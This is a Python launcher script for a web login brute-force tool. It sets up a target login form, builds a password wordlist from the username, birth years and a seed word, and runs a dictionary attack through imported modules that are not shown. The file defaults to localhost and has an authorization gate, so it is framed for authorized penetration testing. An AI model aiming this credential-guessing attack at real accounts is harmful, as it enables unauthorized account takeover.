"""
run_web_attack.py
-------------------
CLI entry point for the web login tester. Fill in the target details
below to match whatever login page you're authorized to test.
"""

from web_login_tester import WebLoginTester
from dictionary_generator import generate_wordlist

# ============================================================
# 1. CONFIGURE THIS SECTION FOR THE TARGET LOGIN PAGE
# ============================================================

TARGET_LOGIN_URL = "http://127.0.0.1:8000/login"   # the target form's action URL
USERNAME_FIELD = "username"                         # inspect the HTML <input name="...">
PASSWORD_FIELD = "password"
CSRF_FIELD = None                                   # e.g. "csrf_token", or None if not used
SUCCESS_TEXT = "Welcome"                            # text that ONLY appears after successful login
TARGET_USERNAME = "testuser"                        # the account you're attacking (authorized)

# Explicit confirmation — change to True only once you've verified you
# own or are authorized to test TARGET_LOGIN_URL.
I_HAVE_AUTHORIZATION = False

# ============================================================

if __name__ == "__main__":
    if not I_HAVE_AUTHORIZATION:
        print("Set I_HAVE_AUTHORIZATION = True at the top of this file "
              "once you've confirmed you're allowed to test this target.")
        raise SystemExit(1)

    wordlist = generate_wordlist(
        names=[TARGET_USERNAME], dobs=["1998", "2000"], extra_seeds=["shadow141"]
    )

    tester = WebLoginTester(
        login_url=TARGET_LOGIN_URL,
        username_field=USERNAME_FIELD,
        password_field=PASSWORD_FIELD,
        csrf_field_name=CSRF_FIELD,
        success_indicator=SUCCESS_TEXT,
        delay_seconds=0.4,
        authorized=True,
    )

    result = tester.dictionary_attack(TARGET_USERNAME, wordlist)
    print(result)
